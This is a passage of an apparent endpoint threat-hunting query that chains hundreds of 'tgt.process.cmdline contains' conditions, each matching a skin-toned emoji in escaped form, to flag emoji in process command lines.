tgt.process.cmdline contains \"\ud83d\udc75\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\uddd3\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc74\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc72\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc73\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc73\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc73\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd5\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc6e\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc6e\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc6e\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc77\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc77\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc77\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc82\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc82\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc82\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udd75\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udd75\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udd75\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\u2695\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\u2695\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\u2695\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\ud83c\udf3e\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\ud83c\udf3e\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\ud83c\udf3e\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\ud83c\udf73\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\ud83c\udf73\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\ud83c\udf73\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\ud83c\udf93\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\ud83c\udf93\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\ud83c\udf93\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\ud83c\udfa4\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\ud83c\udfa4\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\ud83c\udfa4\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\ud83c\udfeb\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\ud83c\udfeb\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\ud83c\udfeb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\ud83c\udfed\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\ud83c\udfed\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\ud83c\udfed\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\ud83d\udcbb\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\ud83d\udcbb\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\ud83d\udcbb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\ud83d\udcbc\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\ud83d\udcbc\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\ud83d\udcbc\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\ud83d\udd27\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\ud83d\udd27\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\ud83d\udd27\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\ud83d\udd2c\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\ud83d\udd2c\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\ud83d\udd2c\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\ud83c\udfa8\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\ud83c\udfa8\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\ud83c\udfa8\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\ud83d\ude92\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\ud83d\ude92\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\ud83d\ude92\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\u2708\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\u2708\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\u2708\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\ud83d\ude80\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\ud83d\ude80\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\ud83d\ude80\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\u2696\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\u2696\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\u2696\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc70\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc70\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc70\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd35\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd35\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udd35\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc78\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udec5\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udd34\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udd77\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\uddb8\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddb8\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\uddb8\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddb9\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddb9\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\uddb9\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd36\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\ud83c\udf84\" or tgt.process.cmdline contains \"\ud83c\udf85\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\uddd9\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd9\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\uddd9\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddd\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddd\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udddd\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddb\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddb\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udddb\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddc\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddc\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udddc\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddda\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddda\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\uddda\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc7c\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udd30\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udec4\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udec3\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udd31\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\ud83c\udf7c\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\ud83c\udf7c\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\ud83c\udf7c\" or tgt.process.cmdline contains \"\ud83d\ude47\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude47\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\ude47\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc81\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc81\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc81\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude45\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude45\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\ude45\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude46\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude46\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\ude46\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4b\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4b\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\ude4b\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddcf\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddcf\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\uddcf\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd26\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd26\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udd26\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd37\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd37\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udd37\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4e\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4e\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\ude4e\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4d\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4d\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\ude4d\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc87\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc87\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc87\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc86\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc86\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc86\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd6\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd6\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\uddd6\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc83\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udd7a\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\ud83e\uddbd\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\ud83e\uddbd\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\ud83e\uddbd\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\ud83e\uddbc\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\ud83e\uddbc\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\ud83e\uddbc\" or tgt.process.cmdline contains \"\ud83d\udeb6\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb6\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udeb6\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\ud83e\uddaf\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\ud83e\uddaf\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\ud83e\uddaf\" or tgt.process.cmdline contains \"\ud83e\uddce\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddce\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\uddce\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc3\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc3\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83c\udfc3\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddcd\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddcd\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\uddcd\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc6d\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\ud83e\udd1d\u200d\ud83e\uddd1\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc6c\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc6b\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\uddd7\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd7\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\uddd7\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc7\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83c\udfc2\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83c\udfcc\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfcc\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83c\udfcc\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc4\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc4\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83c\udfc4\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udea3\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udea3\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udea3\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfca\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfca\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83c\udfca\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\u26f9\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\u26f9\ud83c\udffe\" or tgt.process.cmdline contains \"\u26f9\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfcb\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfcb\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83c\udfcb\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb4\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb4\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udeb4\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb5\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb5\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udeb5\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd38\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd38\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udd38\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd3d\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd3d\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udd3d\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd3e\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd3e\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udd3e\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd39\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd39\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udd39\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd8\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd8\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\uddd8\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udec0\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udecc\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc4b\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udd1a\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udd90\ud83c\udfff\" or tgt.process.cmdline contains \"\u270b\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udd96\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc4c\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udd0c\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udd0f\ud83c\udfff\" or tgt.process.cmdline contains \"\u270c\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udd1e\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udef0\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udd1f\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udd18\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udd19\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udef5\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udef1\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udef2\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udef3\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udef4\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc48\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc49\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc46\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udd95\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc47\ud83c\udfff\" or tgt.process.cmdline contains \"\u261d\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc4d\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc4e\ud83c\udfff\" or tgt.process.cmdline contains \"\u270a\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc4a\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udd1b\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udd1c\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc4f\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udef6\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\ude4c\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc50\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udd32\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\ude4f\ud83c\udfff\" or tgt.process.cmdline contains \"\u270d\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udd33\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udcaa\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddb5\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddb6\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc42\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddbb\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc43\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc76\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc67\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddd2\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc66\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\ud83e\uddb1\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\ud83e\uddb1\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\ud83e\uddb1\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\ud83e\uddb0\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\ud83e\uddb0\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\ud83e\uddb0\" or tgt.process.cmdline contains \"\ud83d\udc71\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc71\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc71\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\ud83e\uddb3\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\ud83e\uddb3\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\ud83e\uddb3\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\ud83e\uddb2\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\ud83e\uddb2\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\ud83e\uddb2\" or tgt.process.cmdline contains \"\ud83e\uddd4\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd4\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddd4\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc75\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddd3\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc74\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc72\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc73\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc73\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc73\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd5\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc6e\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc6e\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc6e\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc77\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc77\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc77\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc82\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc82\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc82\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udd75\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udd75\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udd75\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\u2695\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\u2695\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\u2695\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\ud83c\udf3e\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\ud83c\udf3e\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\ud83c\udf3e\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\ud83c\udf73\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\ud83c\udf73\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\ud83c\udf73\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\ud83c\udf93\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\ud83c\udf93\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\ud83c\udf93\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\ud83c\udfa4\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\ud83c\udfa4\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\ud83c\udfa4\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\ud83c\udfeb\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\ud83c\udfeb\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\ud83c\udfeb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\ud83c\udfed\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\ud83c\udfed\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\ud83c\udfed\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\ud83d\udcbb\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\ud83d\udcbb\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\ud83d\udcbb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\ud83d\udcbc\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\ud83d\udcbc\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\ud83d\udcbc\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\ud83d\udd27\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\ud83d\udd27\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\ud83d\udd27\" or tgt.process.cmdline contains 